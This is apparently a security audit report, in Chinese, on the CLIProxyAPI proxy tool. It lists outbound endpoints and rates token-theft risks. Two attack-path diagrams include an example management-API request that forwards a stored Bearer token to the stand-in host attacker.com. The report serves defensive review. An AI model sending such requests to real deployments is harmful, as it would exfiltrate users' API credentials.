# 01 - 整體風險評估與攻擊路徑分析

## 結論摘要

CLIProxyAPI **不存在任何預設的主動 Token 外洩行為**。所有對外的 HTTP 連線均有明確用途（OAuth 登入、API Proxy、版本更新），通訊目標都是合理的端點。

然而，以下兩個高風險路徑在特定條件下可形成完整的 Token 竊取攻擊鏈：

---

## 已識別外部 HTTP 連線清單

| URL 或 Pattern | 用途 | 位置 | 是否可攜帶 Token |
|----------------|------|------|----------------|
| `https://api.github.com/repos/router-for-me/Cli-Proxy-API-Management-Center/releases/latest` | 下載 management.html 版本資訊 | `managementasset/updater.go` | 否（僅讀取版本資訊） |
| `https://cpamc.router-for.me/` | management.html fallback 頁面 | `managementasset/updater.go` | 否（僅下載靜態 HTML） |
| `https://api.github.com/repos/router-for-me/CLIProxyAPI/releases/latest` | 版本更新通知 | `handlers/management/config_basic.go` | 否 |
| `https://auth.openai.com/oauth/*` | OpenAI OAuth 登入 | `auth/codex/` | OAuth 流程必要（access code） |
| `https://auth.openai.com/api/accounts/deviceauth/*` | OpenAI Device Flow | `cmd/openai_device_login.go` | Device flow 必要 |
| `https://oauth2.googleapis.com/token` | Google OAuth Token 刷新 | `auth/gemini/`, `auth/antigravity/` | 刷新 Token 必要 |
| `https://cloudcode-pa.googleapis.com` | Gemini CLI 使用者 API | `runtime/geminicli/` | Bearer Token（正常使用） |
| `https://httpbin.org/anything` | 範例程式碼測試 | `examples/` 目錄 | **僅範例，非執行路徑** |
| 使用者設定的上游 API 端點 | 轉發使用者的 LLM 請求 | proxy 核心 | 含 Bearer Token（設計如此） |

---

## 攻擊路徑一：Management HTML 注入（供應鏈攻擊）

```
攻擊者控制 cpamc.router-for.me 或篡改 GitHub releases
  ↓
CLIProxyAPI 每 3 小時自動下載惡意 management.html
  ↓
使用者打開管理面板（browser）
  ↓
惡意 JavaScript 呼叫 POST /v0/management/api-call
  包含 {"auth_index":"0","method":"POST","url":"https://attacker.com","header":{"Authorization":"Bearer $TOKEN$"}}
  ↓
CLIProxyAPI 將實際 Bearer Token 傳送至攻擊者伺服器
```

**前提條件：**
- 攻擊者需控制 `cpamc.router-for.me` 或 `github.com/router-for-me/Cli-Proxy-API-Management-Center` releases
- 管理面板未被 `disable-control-panel: true` 停用

**嚴重度：** 🔴 HIGH（供應鏈攻擊，且 SHA256 驗證的雜湊值來自同一受信任源，無法防範源頭被篡改的情境）

---

## 攻擊路徑二：管理 Key 被盜後的 Token 竊取

```
攻擊者取得 management key（暴力破解、網路嗅探、設定檔洩漏）
  ↓
攻擊者呼叫 POST /v0/management/api-call
  {"auth_index":"0","method":"POST","url":"https://attacker.com","header":{"Authorization":"Bearer $TOKEN$"}}
  ↓
CLIProxyAPI 將 auth_index 對應的 Token 傳送至攻擊者伺服器
```

**前提條件：**
- 攻擊者需取得 management key 並能存取 management API 端點
- 管理 API 端點需對攻擊者可達（預設 `127.0.0.1`，但若設定為 `0.0.0.0` 則遠端可達）

**嚴重度：** 🔴 HIGH（若管理 Key 被盜，等同完全取得 Token 控制權）

---

## 中風險路徑

### 路徑三：Request Log 洩漏

若使用者啟用 `request-log: true`，發往上游 API 的完整請求（含 `Authorization: Bearer <token>` header）將被寫入本地日誌檔案，**未經任何遮罩**。

**前提條件：** 使用者需主動啟用 `request-log: true`  
**嚴重度：** 🟡 MEDIUM（洩漏至本地，但本地日誌可能被其他惡意程式讀取）

### 路徑四：Token Store 錯誤設定

若使用者將 `GITSTORE_GIT_URL` 設定為攻擊者控制的 Git repository，或 `OBJECTSTORE_*` 設定為攻擊者控制的 S3，所有 Token 均會同步至該遠端。

**前提條件：** 使用者需自行錯誤設定  
**嚴重度：** 🟡 MEDIUM（屬使用者設定錯誤，但後果嚴重）

---

## 確認安全的機制

| 機制 | 說明 |
|------|------|
| 無遙測 / 分析 | 搜尋特定關鍵字後確認無任何主動上傳使用資料的程式碼 |
| Request Headers 遮罩 | `MaskSensitiveHeaderValue()` 正確遮罩日誌中來自用戶端的敏感 Header |
| AMP Proxy Header 清理 | 轉發至 `ampcode.com` 前移除使用者 `Authorization` Header |
| OAuth 流程合規 | 所有 OAuth 流程均透過官方端點執行 |
